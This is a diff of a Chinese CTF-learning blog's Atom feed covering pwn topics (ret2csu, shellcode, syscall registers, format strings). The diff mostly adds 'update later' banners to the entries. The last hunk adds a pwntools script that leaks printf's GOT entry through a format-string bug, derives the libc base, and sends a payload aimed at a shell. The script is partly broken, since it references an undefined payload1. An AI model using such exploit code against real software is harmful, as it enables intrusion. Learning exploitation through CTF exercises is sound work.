@@ -13,24 +13,32 @@
         <id>http://jexy-kynner.github.io/2024/07/18/ret2csu/</id>
         <title>ret2csu</title>
         <link rel="alternate" href="http://jexy-kynner.github.io/2024/07/18/ret2csu/"/>
-        <content type="html"></content>
+        <content type="html">&lt;p&gt;&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;之后&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;再&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;更新&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;！！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+</content>
         <updated>2024-07-18T07:45:57.000Z</updated>
     </entry>
     <entry>
         <id>http://jexy-kynner.github.io/2024/07/13/ezret/</id>
         <title>ezret</title>
         <link rel="alternate" href="http://jexy-kynner.github.io/2024/07/13/ezret/"/>
-        <content type="html"></content>
+        <content type="html">&lt;p&gt;&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;之后&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;再&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;更新&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;！！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+</content>
         <updated>2024-07-12T17:34:51.000Z</updated>
     </entry>
     <entry>
         <id>http://jexy-kynner.github.io/2024/07/12/shellcode5-%E6%9A%91%E5%81%87%E9%9B%86%E8%AE%AD/</id>
         <title>shellcode5-暑假集训</title>
         <link rel="alternate" href="http://jexy-kynner.github.io/2024/07/12/shellcode5-%E6%9A%91%E5%81%87%E9%9B%86%E8%AE%AD/"/>
-        <content type="html">&lt;p&gt;&lt;span class=&#34;kbd red&#34;&gt;之后&lt;/span&gt;&lt;br /&gt;
-&lt;span class=&#34;kbd red&#34;&gt;再&lt;/span&gt;&lt;br /&gt;
-&lt;span class=&#34;kbd red&#34;&gt;更新&lt;/span&gt;&lt;br /&gt;
-&lt;span class=&#34;kbd red&#34;&gt;！！&lt;/span&gt;&lt;/p&gt;
+        <content type="html">&lt;p&gt;&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;之后&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;再&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;更新&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;！！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h1 id=&#34;思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#思路&#34;&gt;#&lt;/a&gt; 思路&lt;/h1&gt;
 &lt;blockquote&gt;
 &lt;p&gt;validate 函数是用于验证给定的汇编指令是否为 jmp 指令的函数。具体实现如下：&lt;br /&gt;
@@ -103,7 +111,11 @@ sh.interactive()
         <id>http://jexy-kynner.github.io/2024/07/10/shellcode34-%E6%9A%91%E5%81%87%E9%9B%86%E8%AE%AD/</id>
         <title>shellcode34-暑假集训</title>
         <link rel="alternate" href="http://jexy-kynner.github.io/2024/07/10/shellcode34-%E6%9A%91%E5%81%87%E9%9B%86%E8%AE%AD/"/>
-        <content type="html">&lt;h1 id=&#34;系统调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统调用&#34;&gt;#&lt;/a&gt; 系统调用&lt;/h1&gt;
+        <content type="html">&lt;p&gt;&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;之后&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;再&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;更新&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;！！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;系统调用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#系统调用&#34;&gt;#&lt;/a&gt; 系统调用&lt;/h1&gt;
 &lt;h2 id=&#34;顺序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#顺序&#34;&gt;#&lt;/a&gt; 顺序&lt;/h2&gt;
 &lt;h3 id=&#34;32位&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#32位&#34;&gt;#&lt;/a&gt; 32 位&lt;/h3&gt;
 &lt;p&gt;第一个参数   ebx&lt;br /&gt;
@@ -114,15 +126,6 @@ edi&lt;br /&gt;
 ebp&lt;br /&gt;
  大于六个时，全部参数存放在一块连续的内存中中，同时 ebx 中保存着指向该内存的指针&lt;/p&gt;
 &lt;h3 id=&#34;64位&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#64位&#34;&gt;#&lt;/a&gt; 64 位&lt;/h3&gt;
-&lt;h4 id=&#34;参数6个&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参数6个&#34;&gt;#&lt;/a&gt; 参数 &amp;lt;=6 个&lt;/h4&gt;
-&lt;p&gt;第一个参数	 rdi&lt;br /&gt;
-rsi&lt;br /&gt;
-rdx&lt;br /&gt;
-r10&lt;br /&gt;
-r8&lt;br /&gt;
-r9&lt;br /&gt;
- 大于六个时，全部参数存放在一块连续的内存中中，同时 ebx 中保存着指向该内存的指针&lt;/p&gt;
-&lt;h4 id=&#34;参数小于7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参数小于7&#34;&gt;#&lt;/a&gt; 参数小于 7&lt;/h4&gt;
 &lt;p&gt;第一个参数	 rdi&lt;br /&gt;
 rsi&lt;br /&gt;
 rdx&lt;br /&gt;
@@ -195,7 +198,11 @@ read(3,buf,0x100)&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt; 3 是 fd 描
         <id>http://jexy-kynner.github.io/2024/06/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
         <title>格式化字符串</title>
         <link rel="alternate" href="http://jexy-kynner.github.io/2024/06/16/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
-        <content type="html">&lt;p&gt;&lt;s&gt;诶啊啊啊为什么博客加载这么缓慢啊&lt;/s&gt;&lt;br /&gt;
+        <content type="html">&lt;p&gt;&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;之后&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;再&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;更新&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt;！！&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;
+&lt;s&gt;诶啊啊啊为什么博客加载这么缓慢啊&lt;/s&gt;&lt;br /&gt;
  [还没咋学，会更新的，会的].{.kbd .red}&lt;br /&gt;
 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWNodW5xaXUvcC85MzI5Mzg3Lmh0bWw=&#34;&gt;&lt;/span&gt;&lt;br /&gt;
 [参考博客]: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeV9fX3lzeS9hcnRpY2xlL2RldGFpbHMvMTM1NzAwMTQw&#34;&gt;https://blog.csdn.net/ysy___ysy/article/details/135700140&lt;/span&gt;&lt;br /&gt;
@@ -209,6 +216,38 @@ read(3,buf,0x100)&lt;span class=&#34;kbd red&#34;&gt;&lt;strong&gt; 3 是 fd 描
  如输出第五个参数可以写为 %4&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mtext&gt;，第六个为&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;s，第六个为%5&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;第&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;六&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;个&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;为&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;s，需要输出第 n 个参数就是 %(n-1)[格式化控制符]。因此我们的payload可以简化为”\x01\x80\x04\x08%5s”&lt;/p&gt;
 &lt;p&gt;有一个还挺方便的函数 payload = fmtstr_payload (偏移，{原地址：目的地址})&lt;br /&gt;
 payload = fmtstr_payload(11,{0x0804A048:0xC0})&lt;/p&gt;
+&lt;p&gt;from pwn import *&lt;br /&gt;
+from LibcSearcher import *&lt;br /&gt;
+context(log_level = &#39;debug&#39;, os = &#39;linux&#39;, arch = &#39;amd64&#39;)&lt;br /&gt;
+p = process(&#39;./ez_fmt&#39;)&lt;br /&gt;
+#p = remote(&#39;127.0.0.1&#39;,46587)&lt;br /&gt;
+elf = ELF(&amp;quot;./ez_fmt&amp;quot;)&lt;br /&gt;
+printf_plt = elf.plt[&#39;printf&#39;]&lt;br /&gt;
+printf_got = elf.got[&#39;printf&#39;]&lt;br /&gt;
+pop_rdi_ret=0x4012d3&lt;br /&gt;
+payload = b&amp;quot;aaaa&amp;quot; +b&amp;quot;%7s&#34; + p64(printf_got)
+&#39;&#39;&#39;
+gdb.attach(p)
+pause()
+&#39;&#39;&#39;
+p.sendline(payload)
+p.recvuntil(&#39;aaaa&#39;)
+printf_addr = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
+print(&#34;printf_real_addr ---&gt; &#34;, hex(printf_addr))
+libc=ELF(&#39;./libc.so.6&#39;)       
+libc_base=printf_addr-libc.sym[&#39;printf&#39;]      #libc的真实的基址=puts的真实地址-puts相对于libc基址的偏移量
+bin_sh_addr=libc_base+libc.search(b&#34;/bin/sh\x00&#34;).__next__()#&#39;/bin/sh&#39;的真实地址=libc基址的真实地址+&#39;/bin/sh&#39;相对于libc基址的偏移量
+sys_addr=libc_base+libc.sym[&#39;system&#39;]
+print(&#34;sys_addr:{}&#34;.format(hex(sys_addr)))
+print(&#34;binsh_addr:{}&#34;.format(hex(bin_sh_addr)))
+#payload2= b&#39;%&#39; + str(system_real_addr) + b&#39;c&#39; + b&#39;%7n&#39; + p64(printf_got)&lt;br /&gt;
+&#39;&#39;&#39;&lt;br /&gt;
+gdb.attach(p)&lt;br /&gt;
+pause()&lt;br /&gt;
+&#39;&#39;&#39;&lt;br /&gt;
+p.sendline(payload1)&lt;br /&gt;
+p.sendline(b&#39;/bin/sh\0&#39;)&lt;br /&gt;
+p.interactive()&lt;/p&gt;
 </content>
         <category term="Pwn" scheme="http://jexy-kynner.github.io/categories/Pwn/" />
         <category term="stack" scheme="http://jexy-kynner.github.io/tags/stack/" />
